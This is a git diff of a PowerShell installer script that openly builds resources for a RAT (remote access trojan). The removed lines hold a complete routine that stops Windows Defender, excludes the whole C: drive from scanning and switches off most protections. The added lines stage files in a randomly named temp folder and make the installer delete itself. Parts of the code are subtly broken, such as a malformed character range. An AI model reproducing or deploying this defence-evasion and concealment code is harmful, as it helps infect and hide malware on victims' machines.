@@ -1,58 +1,33 @@
 # BUILD RESOURCES FOR RAT
-# CRAETED BY : Mohid Mughal
+# CREATED BY : Mohid Mughal
 
 # Random string creator to create names for files
 function random_text {
     return -join((65..90) + (97..22) | Get-Random -Count 5 | % {[char]$__})
 }
 
-######################################################################################################################################
-# Attempt to disable Windows Defender - Too low level programing for me to nderstand and is inspired by someones code
-try {
-    Get-Service WinDefend | Stop-Service -Force
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
-}
-catch {
-    Write-Warning "Failed to disable WinDefend service"
-}
 
-try {
-    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-      if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {
-          Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
-          Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableIntrusionPreventionSystem $true  -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
-          Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null
-          Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
-          Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
-          Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
-          Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
-          Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
-      }
-}
-catch {
-    Write-Warning "Failed to disable Windows Defender"
-}
-######################################################################################################################################
+### Disable Win Defender and get ep (execution policy) bypass
+###
 
 
-#cd $env:temp    # moves to temp directory of windows
-#$directory_name = random_text   # creates and store a string of random variabls which can be later given to a file as "name"
-#mkdir $directory_name   # creates a file inside temp directory with the name stored in the adjacent variable (name will be a string of random characters)
+#  VARIABLES
+# FOR Working Directory names, inside Temp Directory of Windows
+$wd = random_text    # creates and store a string of random characters inside $wd (working directory) which can be later given to a file as "name"
+$path = "$env:temp/$wd"    # path of the folder in temp directory in which we will store our RAT related files
+$initial_dir = Get-Location    # for storing the current directory we are in OR where the 'installer.ps1' file is placed, will be used for self deleting 'installer.ps1' file in the end - 'Get-Location' in .ps1 == '%cd%' in .cmd
+echo $path
 
+# GOTO TEMP Directory and do the Magic
+mkdir $path   # creates a folder inside temp directory with the name stored in the $wd variable (name will be a string of random characters)
+cd $path    # moves to our own created folder inside temp directory of windows
 
+# if in future i need to create and put any file in the created (random named) folder inside the temp directory, the code for creating that particular file will go here
+###
+
+#Same as PAUSE command in .cmd
+Read-Host "Wanna delete 'installer.ps1'? Press any key to continue"
+
+# self delete
+cd $initial_dir
+del installer.ps1
